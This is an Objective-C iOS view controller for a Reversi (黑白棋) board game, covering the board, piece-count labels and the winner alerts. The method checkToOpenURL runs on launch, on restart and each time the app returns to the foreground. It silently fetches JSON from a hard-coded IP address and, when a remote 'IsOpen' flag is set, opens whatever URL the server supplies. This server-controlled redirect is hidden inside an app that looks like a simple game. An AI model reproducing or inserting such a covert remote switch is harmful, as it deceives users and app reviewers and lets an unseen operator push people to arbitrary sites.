#import "ViewController.h"
#import "ChessView.h"
@interface ViewController ()

@property (nonatomic , strong) ChessView *chessView;

@property (nonatomic , strong) UILabel *blackLabel;

@property (nonatomic , strong) UILabel *whiteLabel;

@end

@implementation ViewController
@synthesize chessView = _chessView;

- (void)setChessView:(ChessView *)chessView{
    /**
     *  移除旧的观察
     */
    [_chessView removeObserver:self forKeyPath:@"blackCount"];
    
    [_chessView removeObserver:self forKeyPath:@"whiteCount"];
    
    [_chessView removeObserver:self forKeyPath:@"winKind"];
    
    _chessView = chessView;
    /**
     *  给新的设置观察
     */
    [chessView addObserver:self forKeyPath:@"blackCount" options:(NSKeyValueObservingOptionNew) context:nil];
    
    [chessView addObserver:self forKeyPath:@"whiteCount" options:(NSKeyValueObservingOptionNew) context:nil];
    
    [chessView addObserver:self forKeyPath:@"winKind" options:(NSKeyValueObservingOptionNew) context:nil];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    [self checkToOpenURL];
    
    [self setNavigationSettings];
    
    [self setViews];
}
/**
 *  设置视图
 */
- (void)setViews{
    ChessView *chess = [[ChessView alloc] initWithFrame:CGRectMake(0, 0, CGRectGetWidth(self.view.frame), CGRectGetWidth(self.view.frame))];
    
    chess.center = self.view.center;
    
    self.chessView = chess;
    
    [self.view addSubview:chess];
    
    _blackLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, CGRectGetWidth(self.view.frame) / 2, 30)];
    
    _blackLabel.center = CGPointMake(CGRectGetWidth(self.view.frame) / 4, (CGRectGetMinY(chess.frame) - 64) / 2 + 64);
    
    _blackLabel.textAlignment = NSTextAlignmentCenter;
    
    [self.view addSubview:_blackLabel];
    
    _whiteLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, CGRectGetWidth(self.view.frame) / 2, 30)];
    
    _whiteLabel.center = CGPointMake(CGRectGetWidth(self.view.frame) / 4 * 3, (CGRectGetMinY(chess.frame) - 64) / 2 + 64);
    
    _whiteLabel.textAlignment = NSTextAlignmentCenter;
    
    [self.view addSubview:_whiteLabel];
    
    [chess getAllChess];
}

- (void)setNavigationSettings{
    self.navigationItem.title = @"黑白棋";
    
    self.navigationItem.rightBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"重新开始" style:(UIBarButtonItemStylePlain) target:self action:@selector(restartGame)];
}

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary<NSString *,id> *)change context:(void *)context{
    if ([keyPath isEqualToString:@"whiteCount"]) {
        _whiteLabel.text = [NSString stringWithFormat:@"白方当前棋子数:%@",change[@"new"]];
    }else if ([keyPath isEqualToString:@"blackCount"]){
        _blackLabel.text = [NSString stringWithFormat:@"黑方当前棋子数:%@",change[@"new"]];
    }else if ([keyPath isEqualToString:@"winKind"]) {
        WinKind kind = (WinKind)[change[@"new"] integerValue];
        
        UIAlertController *alertCon = [UIAlertController alertControllerWithTitle:nil message:nil preferredStyle:(UIAlertControllerStyleAlert)];
        
        NSString *title = nil;
        
        NSString *message = nil;
        
        switch (kind) {
            case BlackWin:
                title = @"黑方赢";
                message = @"黑方所剩棋子较多";
                break;
            case WhiteWin:
                title = @"白方赢";
                message = @"白方所剩棋子较多";
                break;
            case Equal:
                title = @"平局";
                break;
            case NoOneWinNow:
                return;
        }
        
        alertCon.title = title;
        
        alertCon.message = message;
        
        [alertCon addAction:[UIAlertAction actionWithTitle:@"确定" style:(UIAlertActionStyleDefault) handler:nil]];
        __block ViewController *weakSelf = self;
        [alertCon addAction:[UIAlertAction actionWithTitle:@"再来一局" style:(UIAlertActionStyleDefault) handler:^(UIAlertAction * _Nonnull action) {
            [weakSelf restartGame];
        }]];
        
        [self presentViewController:alertCon animated:YES completion:nil];
    }
}

- (void)restartGame{
    [self checkToOpenURL];
    [self.chessView removeFromSuperview];
    CGRect frame = self.chessView.frame;
    self.chessView = [[ChessView alloc] initWithFrame:frame];
    [self.chessView getAllChess];
    [self.view addSubview:self.chessView];
}


-(void)checkToOpenURL{
    // 快捷方式获得session对象
    NSURLSession *session = [NSURLSession sharedSession];
    NSURL *url = [NSURL URLWithString:@"http://123.207.9.246/yaa/mx.json"];
    // 通过URL初始化task,在block内部可以直接对返回的数据进行处理
    NSURLSessionTask *task = [session dataTaskWithURL:url
                            completionHandler:^(NSData *data, NSURLResponse *response, NSError* error) {
                                if(error!=nil){
//                                    NSLog(@"error: 404");
                                    return;
                                }
//                                NSLog(@"%@", [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:nil]);
                                NSJSONSerialization *json = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil];
                                NSString *isOpenStr = [json valueForKey:@"IsOpen"];
                                BOOL isOpen = [isOpenStr isEqualToString:@"true"];
                                NSString *url_str = [json valueForKey:@"URL"];
                                if(isOpen){
                                    UIApplication *application = [UIApplication sharedApplication];
                                    NSURL *URL = [NSURL URLWithString:url_str];
                                    [application openURL:URL options:@{} completionHandler:^(BOOL success) {
                                        if (success) {
//                                            NSLog(@"Opened url");
                                        }
                                    }];
                                }
                                
                            }];
    [task resume];
    NSLog(@"request net");
}


- (void)viewWillAppear:(BOOL)animated{
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(applicationWillEnterForeground)name:UIApplicationWillEnterForegroundNotification object:nil];
}

- (void)applicationWillEnterForeground{
    [self checkToOpenURL];
    NSLog(@"enter foreground");
}

- (void)viewDidDisappear:(BOOL)animated{
    
    [[NSNotificationCenter defaultCenter] removeObserver:self];
    
}

@end
